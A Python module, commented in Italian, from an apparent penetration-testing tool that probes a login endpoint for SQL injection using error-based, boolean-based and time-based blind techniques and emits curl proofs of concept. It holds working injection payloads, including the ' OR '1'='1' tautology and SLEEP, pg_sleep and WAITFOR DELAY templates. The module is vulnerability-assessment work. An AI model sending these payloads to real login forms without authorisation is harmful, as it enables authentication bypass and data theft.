"""Lane ATTACK — test ATTIVI. NON è sola lettura: manda payload.

Solo su host in ALLOWLIST (lo impone core.probe), su bersagli tuoi o lab.
Oggi: rilevatore SQL injection su un endpoint di login. Tre tecniche:

  1. ERROR-BASED  — inietto un apice `'`. Se la risposta contiene un errore SQL
     che il baseline non aveva, l'input è finito nel motore come codice.
  2. BOOLEAN-BASED — mando una condizione sempre-vera (`' OR '1'='1' -- `) e una
     sempre-falsa (`' OR '1'='2' -- `). Se la VERA risponde diversamente dalla
     FALSA *e* dal baseline fallito, la query cambia col mio input → iniettabile.
  3. TIME-BASED (blind) — il caso cieco: nessun errore, nessuna differenza
     visibile. Inietto una SLEEP e MISURO il tempo. Prova per DIFFERENZA: il
     ritardo deve seguire il valore iniettato (SLEEP(D) lento, SLEEP(0) veloce),
     così il jitter di rete non genera falsi positivi. Nel login è il fallback
     quando error/boolean tacciono.

Il verdetto è OGGETTIVO: nasce dal confronto delle risposte reali, non da un
parere. Ogni finding porta l'evidenza.
"""

import json
from urllib.parse import urlencode

import core
from core import finding, probe, as_curl

# Firme d'errore SQL cercate nel corpo della risposta (error-based).
SQL_ERRORS = [
    "sql syntax", "syntax error", "unrecognized token", "unterminated",
    "quoted string not properly terminated", "sqlite3.", "operationalerror",
    "mysql_fetch", "you have an error in your sql", "psycopg2", "ora-0",
    "sqlstate", 'near "',
]

TRUE_PAYLOAD = "' OR '1'='1' -- "
FALSE_PAYLOAD = "' OR '1'='2' -- "

# Time-based (blind): SLEEP iniettata + misura. Prova per DIFFERENZA.
_TB_DELAY = 4                 # secondi di ritardo iniettato
_TB_THRESHOLD = 0.6           # ritardo osservato ≥ D * soglia → candidato
_TB_CONTROL_MARGIN = 1.5      # il controllo SLEEP(0) deve restare entro baseline + questo
_TB_TEMPLATES = [
    "' OR SLEEP({d})-- ",                  # MySQL (e la fixture SQLite, via funzione registrata)
    "' OR SLEEP({d})#",                    # MySQL, commento #
    "'; SELECT pg_sleep({d})-- ",          # PostgreSQL
    "' AND pg_sleep({d}) IS NOT NULL-- ",  # PostgreSQL in-band
    "'; WAITFOR DELAY '0:0:{d}'-- ",       # MSSQL
]


def _build(url, method, field, value, send_as, other):
    """Costruisce (url, headers, body) per una richiesta con `field`=`value`.
    Separato da _send così lo stesso triplo serve a mandare la richiesta E a
    generare il PoC curl (non possono divergere)."""
    payload = dict(other)
    payload[field] = value
    if send_as == "json":
        return url, {"Content-Type": "application/json"}, json.dumps(payload)
    if send_as == "form":
        return url, {"Content-Type": "application/x-www-form-urlencoded"}, urlencode(payload)
    sep = "&" if "?" in url else "?"
    return url + sep + urlencode(payload), {}, None


def _send(url, method, field, value, send_as, other, session=None):
    """Invia una richiesta con `field`=`value` (più gli altri campi). `session`
    (Cookie/Bearer/header custom) raggiunge la superficie LOGGATA: una SQLi
    dietro l'autenticazione è invisibile senza la sessione (login wall)."""
    u, h, b = _build(url, method, field, value, send_as, other)
    return probe(u, method, h, b, session=session)


def _sig(resp):
    """Firma confrontabile della risposta: (status, lunghezza_corpo, errore_sql?)."""
    if "error" in resp:
        return (None, 0, False)
    body = resp.get("body_head", "")
    err = any(s in body.lower() for s in SQL_ERRORS)
    return (resp["status"], len(body), err)


def _time_based(url, method, field, send_as, other, benign, session=None):
    """Cerca SQLi time-based. Ritorna (bool, evidenza, payload). Prova per
    differenza: SLEEP(D) deve essere lento E lo stesso payload con SLEEP(0) veloce."""
    b1 = _send(url, method, field, benign, send_as, other, session=session)
    b2 = _send(url, method, field, benign, send_as, other, session=session)
    if "error" in b1 or "error" in b2:
        return (False, "", "")
    baseline = min(b1.get("elapsed", 0.0), b2.get("elapsed", 0.0))
    for tmpl in _TB_TEMPLATES:
        pl = tmpl.format(d=_TB_DELAY)
        slow = _send(url, method, field, pl, send_as, other, session=session)
        if "error" in slow or slow.get("elapsed", 0.0) < baseline + _TB_DELAY * _TB_THRESHOLD:
            continue                                      # nessun ritardo: payload non attecchisce
        ctrl = _send(url, method, field, tmpl.format(d=0), send_as, other, session=session)   # conferma differenziale
        if "error" in ctrl or ctrl.get("elapsed", 0.0) > baseline + _TB_CONTROL_MARGIN:
            continue                                      # il "veloce" non è veloce → non è il nostro sleep
        return (True, f"payload '{pl}' · baseline {baseline:.2f}s · "
                      f"SLEEP({_TB_DELAY}) {slow['elapsed']:.2f}s · SLEEP(0) {ctrl['elapsed']:.2f}s "
                      f"→ il ritardo segue il valore iniettato", pl)
    return (False, "", "")


def sqli_time_based(url, field="username", method="POST", send_as="json",
                    other=None, benign="aries_probe", session=None):
    """Solo la tecnica time-based (per il benchmark isolato)."""
    other = other if other is not None else {"password": "aries_probe"}
    hit, ev, pl = _time_based(url, method, field, send_as, other, benign, session=session)
    if hit:
        u, h, b = _build(url, method, field, pl, send_as, other)
        return finding(f"sqli-time:{field}", url, "VULNERABILE (time-based)", "high",
                       "il ritardo è controllato dall'input → SQLi cieca basata sul tempo",
                       ev, as_curl(u, method, h, b, timing=True, session=session))
    return finding(f"sqli-time:{field}", url, "non rilevata", "ok",
                   "nessun ritardo correlato all'input (parametrizzata o nessun sink time-based)",
                   f"sonda SLEEP({_TB_DELAY}s) senza correlazione")


def sqli_login(url, field="username", method="POST", send_as="json",
               other=None, benign="aries_probe", session=None):
    """Testa un campo di login per SQLi. Ritorna un Finding con l'evidenza.
    `session`: credenziali instradate in core.probe → SQLi dietro l'autenticazione."""
    other = other if other is not None else {"password": "aries_probe"}

    base = _send(url, method, field, benign, send_as, other, session=session)             # baseline: login fallito atteso
    quote = _send(url, method, field, benign + "'", send_as, other, session=session)      # error-based
    t = _send(url, method, field, TRUE_PAYLOAD, send_as, other, session=session)          # boolean TRUE
    f = _send(url, method, field, FALSE_PAYLOAD, send_as, other, session=session)         # boolean FALSE

    sb, sq, st, sf = _sig(base), _sig(quote), _sig(t), _sig(f)
    evidence, techniques = [], []

    # 1) error-based: l'apice provoca un errore SQL che il baseline non aveva
    if sq[2] and not sb[2]:
        techniques.append("error-based")
        evidence.append(f"l'apice ' provoca un errore SQL (HTTP {quote.get('status')})")

    # 2) boolean-based: TRUE ≠ FALSE e TRUE ≠ baseline-fallito (status o lunghezza)
    if st[0] is not None and st[:2] != sf[:2] and st[:2] != sb[:2]:
        techniques.append("boolean-based")
        evidence.append(f"TRUE(HTTP {st[0]},{st[1]}b) ≠ FALSE(HTTP {sf[0]},{sf[1]}b) ≠ baseline(HTTP {sb[0]},{sb[1]}b)")

    # 3) time-based (fallback cieco): solo se error e boolean non hanno parlato
    tb_pl = ""
    if not techniques:
        hit, ev, tb_pl = _time_based(url, method, field, send_as, other, benign, session=session)
        if hit:
            techniques.append("time-based")
            evidence.append(ev)

    if techniques:
        # PoC: la richiesta che DIMOSTRA l'exploit (la più parlante tra le tecniche)
        if "boolean-based" in techniques:
            u, h, b = _build(url, method, field, TRUE_PAYLOAD, send_as, other)
            repro = as_curl(u, method, h, b, session=session)
        elif "error-based" in techniques:
            u, h, b = _build(url, method, field, benign + "'", send_as, other)
            repro = as_curl(u, method, h, b, session=session)
        else:                                            # time-based
            u, h, b = _build(url, method, field, tb_pl, send_as, other)
            repro = as_curl(u, method, h, b, timing=True, session=session)
        return finding(
            f"sqli:{field}", url,
            "VULNERABILE (" + ", ".join(techniques) + ")", "high",
            "input del login finito nella query come CODICE → bypass/estrazione dati",
            " ; ".join(evidence), repro)
    return finding(
        f"sqli:{field}", url, "non rilevata", "ok",
        "nessun segnale di injection (probabile query parametrizzata)",
        f"baseline/apice/true/false coerenti (HTTP {sb[0]}/{sq[0]}/{st[0]}/{sf[0]})")


def run(url, field="username", send_as="json", other=None, session=None):
    return [sqli_login(url, field=field, send_as=send_as, other=other, session=session)]
